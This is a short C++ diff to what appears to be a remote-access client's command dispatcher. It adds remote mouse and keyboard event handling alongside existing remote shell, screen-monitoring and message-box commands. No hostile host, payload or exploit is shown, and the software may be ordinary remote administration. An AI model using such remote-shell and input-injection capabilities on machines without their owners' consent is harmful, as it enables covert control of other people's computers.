@@ -106,7 +106,8 @@ private:
             else if (action == "shellstart" || action == "shellcommand" || action == "shellstop") {
                 execute_remote_shell_command(data);
             }
-            else if (action == "monitorlist" || action == "monitorstart" || action == "monitorstop") {
+            else if (action == "monitorlist" || action == "monitorstart" || action == "monitorstop" ||
+                     action == "mouseevent" || action == "keyevent") {
                 execute_remote_monitoring_command(data);
             }
             else if (action == "message" || action == "messagebox") {
